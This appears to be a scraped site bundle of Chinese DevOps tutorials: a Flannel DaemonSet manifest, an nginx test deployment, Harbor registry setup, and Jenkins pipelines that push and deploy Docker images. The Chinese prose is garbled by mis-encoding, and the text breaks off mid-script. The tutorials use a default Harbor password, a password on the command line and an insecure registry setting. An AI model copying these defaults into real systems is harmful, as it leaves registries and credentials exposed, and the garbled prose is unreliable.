flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeaffinity:\n          requiredduringschedulingignoredduringexecution:\n            nodeselectorterms:\n              - matchexpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: in\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: in\n                    values:\n                      - arm\n      hostnetwork: true\n      tolerations:\n      - operator: exists\n        effect: noschedule\n      serviceaccountname: flannel\n      initcontainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-arm\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumemounts:\n        - name: cni\n          mountpath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-arm\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50mi"\n          limits:\n            cpu: "100m"\n            memory: "50mi"\n        securitycontext:\n          privileged: false\n          capabilities:\n             add: ["net_admin"]\n        env:\n        - name: pod_name\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.name\n        - name: pod_namespace\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.namespace\n        volumemounts:\n        - name: run\n          mountpath: /run/flannel\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostpath:\n            path: /run/flannel\n        - name: cni\n          hostpath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configmap:\n            name: kube-flannel-cfg\n---\napiversion: apps/v1\nkind: daemonset\nmetadata:\n  name: kube-flannel-ds-ppc64le\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchlabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeaffinity:\n          requiredduringschedulingignoredduringexecution:\n            nodeselectorterms:\n              - matchexpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: in\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: in\n                    values:\n                      - ppc64le\n      hostnetwork: true\n      tolerations:\n      - operator: exists\n        effect: noschedule\n      serviceaccountname: flannel\n      initcontainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-ppc64le\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumemounts:\n        - name: cni\n          mountpath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-ppc64le\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50mi"\n          limits:\n            cpu: "100m"\n            memory: "50mi"\n        securitycontext:\n          privileged: false\n          capabilities:\n             add: ["net_admin"]\n        env:\n        - name: pod_name\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.name\n        - name: pod_namespace\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.namespace\n        volumemounts:\n        - name: run\n          mountpath: /run/flannel\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostpath:\n            path: /run/flannel\n        - name: cni\n          hostpath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configmap:\n            name: kube-flannel-cfg\n---\napiversion: apps/v1\nkind: daemonset\nmetadata:\n  name: kube-flannel-ds-s390x\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchlabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeaffinity:\n          requiredduringschedulingignoredduringexecution:\n            nodeselectorterms:\n              - matchexpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: in\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: in\n                    values:\n                      - s390x\n      hostnetwork: true\n      tolerations:\n      - operator: exists\n        effect: noschedule\n      serviceaccountname: flannel\n      initcontainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-s390x\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumemounts:\n        - name: cni\n          mountpath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-s390x\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50mi"\n          limits:\n            cpu: "100m"\n            memory: "50mi"\n        securitycontext:\n          privileged: false\n          capabilities:\n             add: ["net_admin"]\n        env:\n        - name: pod_name\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.name\n        - name: pod_namespace\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.namespace\n        volumemounts:\n        - name: run\n          mountpath: /run/flannel\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostpath:\n            path: /run/flannel\n        - name: cni\n          hostpath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configmap:\n            name: kube-flannel-cfg\neof\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n182\n183\n184\n185\n186\n187\n188\n189\n190\n191\n192\n193\n194\n195\n196\n197\n198\n199\n200\n201\n202\n203\n204\n205\n206\n207\n208\n209\n210\n211\n212\n213\n214\n215\n216\n217\n218\n219\n220\n221\n222\n223\n224\n225\n226\n227\n228\n229\n230\n231\n232\n233\n234\n235\n236\n237\n238\n239\n240\n241\n242\n243\n244\n245\n246\n247\n248\n249\n250\n251\n252\n253\n254\n255\n256\n257\n258\n259\n260\n261\n262\n263\n264\n265\n266\n267\n268\n269\n270\n271\n272\n273\n274\n275\n276\n277\n278\n279\n280\n281\n282\n283\n284\n285\n286\n287\n288\n289\n290\n291\n292\n293\n294\n295\n296\n297\n298\n299\n300\n301\n302\n303\n304\n305\n306\n307\n308\n309\n310\n311\n312\n313\n314\n315\n316\n317\n318\n319\n320\n321\n322\n323\n324\n325\n326\n327\n328\n329\n330\n331\n332\n333\n334\n335\n336\n337\n338\n339\n340\n341\n342\n343\n344\n345\n346\n347\n348\n349\n350\n351\n352\n353\n354\n355\n356\n357\n358\n359\n360\n361\n362\n363\n364\n365\n366\n367\n368\n369\n370\n371\n372\n373\n374\n375\n376\n377\n378\n379\n380\n381\n382\n383\n384\n385\n386\n387\n388\n389\n390\n391\n392\n393\n394\n395\n396\n397\n398\n399\n400\n401\n402\n403\n404\n405\n406\n407\n408\n409\n410\n411\n412\n413\n414\n415\n416\n417\n418\n419\n420\n421\n422\n423\n424\n425\n426\n427\n428\n429\n430\n431\n432\n433\n434\n435\n436\n437\n438\n439\n440\n441\n442\n443\n444\n445\n446\n447\n448\n449\n450\n451\n452\n453\n454\n455\n456\n457\n458\n459\n460\n461\n462\n463\n464\n465\n466\n467\n468\n469\n470\n471\n472\n473\n474\n475\n476\n477\n478\n479\n480\n481\n482\n483\n484\n485\n486\n487\n488\n489\n490\n491\n492\n493\n494\n495\n496\n497\n498\n499\n500\n501\n502\n503\n504\n505\n506\n507\n508\n509\n510\n511\n512\n513\n514\n515\n516\n517\n518\n519\n520\n521\n522\n523\n524\n525\n526\n527\n528\n529\n530\n531\n532\n533\n534\n535\n536\n537\n538\n539\n540\n541\n542\n543\n544\n545\n546\n547\n548\n549\n550\n551\n552\n553\n554\n555\n556\n557\n558\n559\n560\n561\n562\n563\n564\n565\n566\n567\n568\n569\n570\n571\n572\n573\n574\n575\n576\n577\n578\n579\n580\n581\n582\n583\n584\n585\n586\n587\n588\n589\n590\n591\n592\n593\n594\n595\n596\n597\n598\n599\n600\n601\n602\n603\n604\n\n\næ§è¡ä»¥ä¸å½ä»¤\n\nkubectl apply -f kube-flannel.yml \n\n\n1\n\n\næ¥çèç¹ç¶æï¼åªè¦ä» notready å° ready å°±ç®æå\n\n\n# æå¡é¨ç½²\n\né¨ç½²ä¸ä¸ª nginx ç¨åºï¼æµè¯ä¸éç¾¤æ¯å¦å¨æ­£å¸¸å·¥ä½ï¼ç´æ¥å¨ master æä½\n\n# é¨ç½²nginx\nkubectl create deployment nginx --image=nginx:1.14-alpine\n# æ´é²ç«¯å£\nkubectl expose deployment nginx --port=80 --type=nodeport\n\n# æ¥çæå¡ç¶æ\n[root@localhost package]# kubectl get pods,svc\nname                         ready   status    restarts   age\npod/nginx-6867cdf567-2l7tr   1/1     running   0          50s\n\nname                 type        cluster-ip       external-ip   port(s)        age\nservice/kubernetes   clusterip   10.96.0.1        <none>        443/tcp        71m\nservice/nginx        nodeport    10.101.119.180   <none>        80:31543/tcp   35s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n31543 è¿ä¸ªç«¯å£å°±æ¯å¤é¨ç«¯å£ï¼å¯ä»¥éè¿èç¹åç§° + ç«¯å£å·ç´æ¥è®¿é®æµè¯',charsets:{cjk:!0}},{title:"Jenkins(ä¸) Jenkins+Docker+SpringCloudå¾®æå¡æç»­éæï¼ä¸ï¼",frontmatter:{title:"Jenkins(ä¸) Jenkins+Docker+SpringCloudå¾®æå¡æç»­éæï¼ä¸ï¼",date:"2023-06-25T09:22:36.000Z",permalink:"/jenkins/506",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/50.Jenkins/506.Jenkins(%E4%B8%83)%20Jenkins+Docker+SpringCloud%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%EF%BC%88%E4%B8%8A%EF%BC%89.html",relativePath:"01.è¿ç»´/50.Jenkins/506.Jenkins(ä¸) Jenkins+Docker+SpringCloudå¾®æå¡æç»­éæï¼ä¸ï¼.md",key:"v-a7c74124",path:"/jenkins/506/",headers:[{level:2,title:"Harbor éåä»åºå®è£åä½¿ç¨",slug:"harbor-éåä»åºå®è£åä½¿ç¨",normalizedTitle:"harbor éåä»åºå®è£åä½¿ç¨",charIndex:269},{level:3,title:"Harbor å®è£",slug:"harbor-å®è£",normalizedTitle:"harbor å®è£",charIndex:734},{level:3,title:"Harbor ä½¿ç¨",slug:"harbor-ä½¿ç¨",normalizedTitle:"harbor ä½¿ç¨",charIndex:1263},{level:3,title:"æ¨éå°éåä»åº",slug:"æ¨éå°éåä»åº",normalizedTitle:"æ¨éå°éåä»åº",charIndex:1440},{level:2,title:"å¾®æå¡æå»ºå°dockeréå",slug:"å¾®æå¡æå»ºå°dockeréå",normalizedTitle:"å¾®æå¡æå»ºå° docker éå",charIndex:2148},{level:2,title:"jenkinsèªå¨åæå¡æåéåå¹¶å¯å¨",slug:"jenkinsèªå¨åæå¡æåéåå¹¶å¯å¨",normalizedTitle:"jenkins èªå¨åæå¡æåéåå¹¶å¯å¨",charIndex:8540},{level:2,title:"vue åç«¯ä½¿ç¨Jenkinsé¨ç½²",slug:"vue-åç«¯ä½¿ç¨jenkinsé¨ç½²",normalizedTitle:"vue åç«¯ä½¿ç¨ jenkins é¨ç½²",charIndex:14905}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"Harbor éåä»åºå®è£åä½¿ç¨ Harbor å®è£ Harbor ä½¿ç¨ æ¨éå°éåä»åº å¾®æå¡æå»ºå°dockeréå jenkinsèªå¨åæå¡æåéåå¹¶å¯å¨ vue åç«¯ä½¿ç¨Jenkinsé¨ç½²",content:'å¤§è´æµç¨è¯´æï¼\n1. å¼åäººåæ¯å¤©æä»£ç æäº¤å° Gitlab ä»£ç ä»åº\n2.Jenkins ä» Gitlab ä¸­æåé¡¹ç®æºç ï¼ç¼è¯å¹¶ææ jar åï¼ç¶åæå»ºæ Docker éåï¼å°éåä¸ä¼ å° Harbor ç§æä»åºã\n3.Jenkins åé SSH è¿ç¨å½ä»¤ï¼è®©çäº§é¨ç½²æå¡å¨å° Harbor ç§æä»åºæåéåå°æ¬å°ï¼ç¶ååå»ºå®¹å¨ã\n4. æåï¼ç¨æ·å¯ä»¥è®¿é®å°å®¹å¨\n\n> è¿éä¸è®²è¿° Docker çå®è£ååºç¡å½ä»¤çä½¿ç¨ï¼å­¦ dockers å¯ä»¥ç Docker æ¦å¿µãå½ä»¤ãDockerFile ç­çè¿ç¯å°±å¤äº è¿ç¯æç« \n\n\n# Harbor éåä»åºå®è£åä½¿ç¨\n\nHarborï¼æ¸¯å£ï¼æ¸¯æ¹¾ï¼æ¯ä¸ä¸ªç¨äºå­å¨ååå Docker éåçä¼ä¸çº§ Registry æå¡å¨ãé¤äº Harbor è¿ä¸ªç§æéåä»åºä¹å¤ï¼è¿æ Docker å®æ¹æä¾ç Registryãç¸å¯¹ Registryï¼Harbor å·æå¾å¤ä¼å¿ï¼\n\n 1. æä¾åå±ä¼ è¾æºå¶ï¼ä¼åç½ç»ä¼ è¾ Docker éåæ¯æ¯åå±çï¼èå¦ææ¯æ¬¡ä¼ è¾é½ä½¿ç¨å¨éæä»¶ (æä»¥\n    ç¨ FTP çæ¹å¼å¹¶ä¸éå)ï¼æ¾ç¶ä¸ç»æµãå¿é¡»æä¾è¯å«åå±ä¼ è¾çæºå¶ï¼ä»¥å±ç UUID ä¸ºæ è¯ï¼ç¡®å®\n    ä¼ è¾çå¯¹è±¡ã\n 2. æä¾ WEB çé¢ï¼ä¼åç¨æ·ä½éª åªç¨éåçåå­æ¥è¿è¡ä¸ä¼ ä¸è½½æ¾ç¶å¾ä¸æ¹ä¾¿ï¼éè¦æä¸ä¸ªç¨æ·ç\n    é¢å¯ä»¥æ¯æç»éãæç´¢åè½ï¼åæ¬åºåå¬æãç§æéåã\n 3. æ¯ææ°´å¹³æ©å±éç¾¤ å½æç¨æ·å¯¹éåçä¸ä¼ ä¸è½½æä½éä¸­å¨ææå¡å¨ï¼éè¦å¯¹ç¸åºçè®¿é®ååä½å\n    è§£ã\n 4. è¯å¥½çå®å¨æºå¶ ä¼ä¸ä¸­çå¼åå¢éæå¾å¤ä¸åçèä½ï¼å¯¹äºä¸åçèä½äººåï¼åéä¸åçæéï¼\n    å·ææ´å¥½çå®å¨æ§ã\n\n\n# Harbor å®è£\n\n 1. é¤äº docker ä»¥å¤ï¼è¿è¦å®è£ dockers-composeï¼Docker Compose å½ä»¤åä½¿ç¨ ä½ å¯ä»¥çè¿ç¯åå®¢\n 2. ä¸è½½ Harbor çåç¼©åï¼å°åï¼éè¦ç§å¼ä¸ç½ï¼ä¸è½½å®æå¼å§è§£å\n\ntar -xzf harbor-offline-installer-v1.9.2.tgz\nmv harbor /opt/software/\n# ä¿®æ¹éç½®æä»¶åå®¹\nvim /opt/software/harbor/harbor.yml \n# ä¿®æ¹hostname\nhostname: ä½ èªå·±æºå¨çIP\n# ä¿®æ¹ç«¯å£\nport: 85\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 3. å®è£ Harbor\n\ncd /opt/software/harbor\n./prepare\n./install.sh\n\n\n1\n2\n3\n\n 4. å¯å¨ Harbor\n\ndocker-compose up -d å¯å¨\ndocker-compose stop åæ­¢\ndocker-compose restart éæ°å¯å¨\n\n\n1\n2\n3\n\n 5. è®¿é® Harbor http://IP:85ï¼é»è®¤è´¦æ·å¯ç ï¼admin/Harbor12345\n\n\n# Harbor ä½¿ç¨\n\n1. åå»ºé¡¹ç®\nHarbor çé¡¹ç®åä¸ºå¬å¼åç§æçï¼\n\n * å¬å¼é¡¹ç®ï¼ææç¨æ·é½å¯ä»¥è®¿é®ï¼éå¸¸å­æ¾å¬å±çéåï¼é»è®¤æä¸ä¸ª library å¬å¼é¡¹ç®ã\n * ç§æé¡¹ç®ï¼åªæææç¨æ·æå¯ä»¥è®¿é®ï¼éå¸¸å­æ¾é¡¹ç®æ¬èº«çéåã\n\næä»¬å¯ä»¥ä¸ºå¾®æå¡é¡¹ç®åå»ºä¸ä¸ªæ°çé¡¹ç®ï¼\n\n\n\n\n\n2. ç¨æ·åå»º\n\n\n\n3. ä¸ºç¨æ·åéé¡¹ç®\n\n\n\n\n\n\n# æ¨éå°éåä»åº\n\n# ææ ç­¾ï¼å½ä»¤ docker tag nginx:1.17.1 HarborçIP:ç«¯å£/Harboré¡¹ç®çåç§°/éååå­\ndocker tag nginx:1.17.1 192.168.81.102:85/test/nginx:1.17.1\n# æ¥ç\ndocker images\n# ä¼å¤ä¸æ¡éåæ°æ®\n192.168.81.102:85/test/nginx         1.17.1                          98ebf73aba75        2 years ago         109MB\n\n\n1\n2\n3\n4\n5\n6\n\n\næ Harbor å°åå å¥å° Docker ä¿¡ä»»åè¡¨\n\n# ç¼è¾dockeræä»¶\nvim /etc/docker/daemon.json\n# å å¥è¿å¥è¯\n"insecure-registries":["192.168.81.102:85"],\n# éå¯éç½®ådocker\nsystemctl restart docker\n# Harbor  ç test é¡¹ç®æ¯ç§æçï¼éè¦ç»å½\ndocker login -u admin -p Harbor12345 192.168.81.102:85\n# æ¨éå°Harborä»åºé\ndocker push 192.168.81.102:85/test/nginx\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n\n\n\nå¶ä»æå¡ä¸è½½éåä¹éè¦æå°åæ·»å å° docker çéç½®æä»¶ä¸­ï¼å¹¶ä¸ä¹éè¦ä½¿ç¨ docker login è¿è¡ç»å½ãå¤å¶ä»¥ä¸çå½ä»¤ï¼å°å¶ä»æå¡å¨ä¸æ§è¡å³å¯ã\n\n\n\n\n# å¾®æå¡æå»ºå° docker éå\n\n1. æå¾®æå¡æäº¤å° SVN\n2. å¨ jenkins ä¸åå»ºä¸ä¸ª Pipelin ç±»åç itemï¼é¡¹ç®ï¼\n3. éç½® Pipelin item çæå»ºæ¶åæ°\n\n\n\n\n\n\n\n> è¿éè®²ä¸ç¹ï¼é¡¹ç®ä¸­å¾å¤ç jar æ¯æä¾èµå³ç³»çï¼å¦æåç¬ææä¸ªæå¡å¯è½ä¼åæ¾ä¸å°ä¾èµï¼æä»¥å»ºè®®ç¬¬ä¸æ¬¡å¯¹æ ¹ç®å½è¿è¡æåï¼ä¼æä¾èµå¨é¨å è½½å° maven åºä¸­ï¼åæåä¸ªæå¡æåå³å¯ã\n\n4. å¨æ¯ä¸ªæå¡ç pom æä»¶ä¸­æ·»å  plugin\n\n\x3c!-- å¸®å©è¯»åé¡¹ç®ä¸­çdockerfileæä»¶ï¼å¸®æä»¬æå»ºdockeréå --\x3e\n<plugin>\n    <groupId>com.spotify</groupId>\n    <artifactId>dockerfile-maven-plugin</artifactId>\n    <version>1.3.6</version>\n    <configuration>\n        <repository>${project.artifactId}</repository>\n        \x3c!-- å®ä¹dockerfile æä»¶çåæ° --\x3e\n        <buildArgs>\n            \x3c!-- å®ä¹ä¸ä¸ª JAVA_FILE åæ°,æä¸ºæä»¬é¡¹ç®çåç§° --\x3e\n            <JAR_FILE>target/${project.build.finalName}.jar</JAR_FILE>\n        </buildArgs>\n    </configuration>\n</plugin>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n5. å¨æ¯ä¸ªæå¡çæ ¹ç®å½ä¸ç¼å Dockerfile æä»¶\n\nFROM openjdk:8-jdk-alpine\n# è¿ä¸ªä¼è¯»åå¨pomä¸­å£°æçåé\nARG JAR_FILE\nCOPY ${JAR_FILE} app.jar\n# å¯¹å¤ç«¯å£\nEXPOSE 10086\nENTRYPOINT ["java","-jar","/app.jar"]\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n6. è®¾ç½®æå»ºåéåæ¨è³éåä»åº\n\n\n\n\n\n\n\n7. å¨é¡¹ç®çæ ¹ç®å½ä¸­ç¼å Jenkinsfile\n\nnode {\n    // çæ¬\n    def tag = "1.0"\n    // éåä»åºçå°å\n    def harbor_url = "192.168.81.102:85"\n    // éåä»åºçé¡¹ç®,è¿éå»ºè®®é¡¹ç®åç§°åjenkinsçitemé¡¹ç®åç§°ãä»¥åharborçé¡¹ç®åç§°ä¿æä¸è´ï¼å¦åç¨ä¸ä¸èæ¬ä¼åºé®é¢\n    def harbor_project = "demo"\n\n    // æåä»£ç \n    stage(\'pull code\') {\n        checkout([$class: \'GitSCM\', branches: [[name: \'*/${branch}\']], extensions: [], userRemoteConfigs: [[credentialsId: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test.git\']]])\n    }\n    // ç¼è¯å¹¶æ¨ééåä»åº\n    stage(\'build project\') {\n        if  ("${project_name}" ==  \'demo\' ) {\n            echo \'æåæ ¹ç®å½\'\n            sh \'mvn clean package dockerfile:build\'\n        } else {\n            echo  "æåå­ç®å½ ${project_name}"\n            sh "mvn -f ${project_name} clean package dockerfile:build"\n        }\n        echo "æjarä¸ä¼ éåä»åº"\n        def oldImageName = "${project_name}:latest"\n        def newImageName = "${harbor_url}/${harbor_project}/${project_name}:${tag}"\n        // æ¹åç§° åè§è\n        sh "docker tag ${oldImageName} ${newImageName}"\n        // å é¤ä¹åç éå\n        sh "docker rmi ${oldImageName}"\n        // æ¨éå° dockersä»åº\n        withCredentials([usernamePassword(credentialsId: \'8a3d7ab1-4cd6-482c-86c9-a12aa6404d98\', passwordVariable: \'harbor_password\', usernameVariable: \'harbor_account\')]) {\n            // ç»å½\n            sh "docker login -u ${harbor_account} -p ${harbor_password} ${harbor_url}"\n            // ä¸ä¼ \n            sh "docker push ${newImageName}"\n            echo "éåæ¨éæå"\n        }\n    }\n    // åéé®ä»¶\n    stage(\'send email\') {\n        emailext body: \'\'\'<!DOCTYPE html>\n        <html>\n        <head>\n            <meta charset="UTF-8">\n            <title>${ENV, var="JOB_NAME"}-ç¬¬${BUILD_NUMBER}æ¬¡æå»ºæ¥å¿</title>\n        </head>\n        <body leftmargin="8" marginwidth="0" topmargin="8" marginheight="4" offset="0">\n        <table width="95%" cellpadding="0" cellspacing="0" style="font-size: 11pt; font-family: Tahoma, Arial, Helvetica, sansserif">\n            <tr>\n                <td>(æ¬é®ä»¶æ¯ç¨åºèªå¨ä¸åçï¼è¯·å¿åå¤ï¼)</td>\n            </tr>\n            <tr>\n                <td><h2>\n                    <font color="#0000FF">æå»ºç»æ - ${BUILD_STATUS}</font>\n                </h2></td>\n            </tr>\n            <tr>\n                <td><br/>\n                    <b><font color="#0B610B">æå»ºä¿¡æ¯</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <ul>\n                        <li>é¡¹ç®åç§°&nbsp;ï¼&nbsp;${PROJECT_NAME}</li>\n                        <li>æå»ºç¼å·&nbsp;ï¼&nbsp;ç¬¬${BUILD_NUMBER}æ¬¡æå»º</li>\n                        <li>è§¦ååå ï¼&nbsp;${CAUSE}</li>\n                        <li>æå»ºæ¥å¿ï¼&nbsp;\n                            <a href="${BUILD_URL}console">${BUILD_URL}console</a>\n                        </li>\n                        <li>æå»º&nbsp;&nbsp;Url&nbsp;ï¼&nbsp;\n                            <a href="${BUILD_URL}">${BUILD_URL}</a>\n                        </li>\n                        <li>å·¥ä½ç®å½&nbsp;ï¼&nbsp;\n                            <a href="${PROJECT_URL}ws">${PROJECT_URL}ws</a>\n                        </li>\n                        <li>é¡¹ç®&nbsp;&nbsp;Url&nbsp;ï¼&nbsp;\n                            <a href="${PROJECT_URL}">${PROJECT_URL}</a>\n                        </li>\n                    </ul>\n                </td>\n            </tr>\n            <tr>\n                <td><b><font color="#0B610B">Changes Since Last Successful Build:</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <ul>\n                        <li>åå²åæ´è®°å½ : <a href="${PROJECT_URL}changes">${PROJECT_URL}changes</a></li>\n                    </ul>\n                    ${CHANGES_SINCE_LAST_SUCCESS,reverse=true, format="Changes for Build #%n:<br/>%c<br/>",showPaths=true,changesFormat="<pre>[%a]<br/>%m</pre>",pathFormat="&nbsp;&nbsp;&nbsp;&nbsp;%p"}\n                </td>\n            </tr>\n            <tr>\n                <td><b>Failed Test Results</b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <pre style="font-size: 11pt; font-family: Tahoma, Arial, Helvetica,sans-serif">\n                        $FAILED_TESTS\n                    </pre>\n                    <br/>\n                </td>\n            </tr>\n            <tr>\n                <td><b><font color="#0B610B">æå»ºæ¥å¿ (æå 100è¡):</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <textarea cols="80" rows="30" readonly="readonly"\n                              style="font-family: Courier New">\n                        ${BUILD_LOG,maxLines=100}\n                    </textarea>\n                </td>\n            </tr>\n        </table>\n        </body>\n        </html>\'\'\', mimeType: \'text/html\', subject: \'43243214321\', to: \'875730567@qq.com\'\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n\n\n\n# jenkins èªå¨åæå¡æåéåå¹¶å¯å¨\n\nè¿é¨æä½éè¦å®è£ä¸ä¸ª Publish Over SSH æä»¶ï¼å®è£å¥½åå¨ Manager Jenkins -> Configure System è¿è¡éç½®\n\n\n\næ´æ¹ Jenkinsfile èæ¬ï¼æ·»å è¿ç¨æºå¨æåéåå¹¶å¯å¨å®¹å¨ï¼å·ä½è¯­æ³æä¹ä½¿ç¨ï¼å¯ä»¥å° æµæ°´çº¿è¯­æ³ä¸­æ¥ç\n\n\n\nnode {\n    // çæ¬\n    def tag = "1.0"\n    // éåä»åºçå°å\n    def harbor_url = "192.168.81.102:85"\n    // éåä»åºçé¡¹ç®,è¿éå»ºè®®é¡¹ç®åç§°åjenkinsçitemé¡¹ç®åç§°ãä»¥åharborçé¡¹ç®åç§°ä¿æä¸è´ï¼å¦åç¨ä¸ä¸èæ¬ä¼åºé®é¢\n    def harbor_project = "demo"\n\n    // æåä»£ç \n    stage(\'pull code\') {\n        checkout([$class: \'GitSCM\', branches: [[name: \'*/${branch}\']], extensions: [], userRemoteConfigs: [[credentialsId: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test.git\']]])\n    }\n    // ç¼è¯å¹¶æ¨ééåä»åº\n    stage(\'build project\') {\n        if  ("${project_name}" ==  \'demo\' ) {\n            echo \'æåæ ¹ç®å½\'\n            sh \'mvn clean package dockerfile:build\'\n        } else {\n            echo  "æåå­ç®å½ ${project_name}"\n            sh "mvn -f ${project_name} clean package dockerfile:build"\n        }\n        echo "æjarä¸ä¼ éåä»åº"\n        def oldImageName = "${project_name}:latest"\n        def newImageName = "${harbor_url}/${harbor_project}/${project_name}:${tag}"\n        // æ¹åç§° åè§è\n        sh "docker tag ${oldImageName} ${newImageName}"\n        // å é¤ä¹åç éå\n        sh "docker rmi ${oldImageName}"\n        // æ¨éå° dockersä»åº\n        withCredentials([usernamePassword(credentialsId: \'8a3d7ab1-4cd6-482c-86c9-a12aa6404d98\', passwordVariable: \'harbor_password\', usernameVariable: \'harbor_account\')]) {\n            // ç»å½\n            sh "docker login -u ${harbor_account} -p ${harbor_password} ${harbor_url}"\n            // ä¸ä¼ \n            sh "docker push ${newImageName}"\n            echo "éåæ¨éæå"\n        }\n\n        // è¿ç¨è°ç¨èæ¬,port æå¥½ä¹æ·»å  jenkinsé¡¹ç®éç½®éçåæ°éç½®ï¼ä½ä¸ºåæ°ä¼ è¿æ¥\n        echo "æ§è¡è¿ç¨å½ä»¤ /home/server/deploy.sh ${harbor_url} ${harbor_project} ${project_name} ${tag} ${port}"\n        sshPublisher(publishers: [sshPublisherDesc(configName: \'test_103\', 